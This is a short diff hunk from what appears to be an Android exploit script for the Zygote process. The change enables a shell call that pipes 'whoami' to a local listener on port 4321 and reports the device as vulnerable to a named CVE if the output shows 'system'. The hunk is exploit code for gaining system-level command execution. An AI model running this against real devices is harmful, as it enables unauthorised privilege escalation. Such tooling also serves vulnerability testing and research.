@@ -3489,7 +3489,7 @@ def exploit_zygote(zip_path, text, prog_text, change):
     else:
         whoami_cmd = "whoami"
     cmd = f'''sh -c \"echo '{whoami_cmd}' | {command} localhost 4321\"'''
-    #z_whoami = device.shell(cmd)
+    z_whoami = device.shell(cmd)
     print(z_whoami)
     if "system" in z_whoami:
         log("Device is vulnerable to CVE-2024–31317")
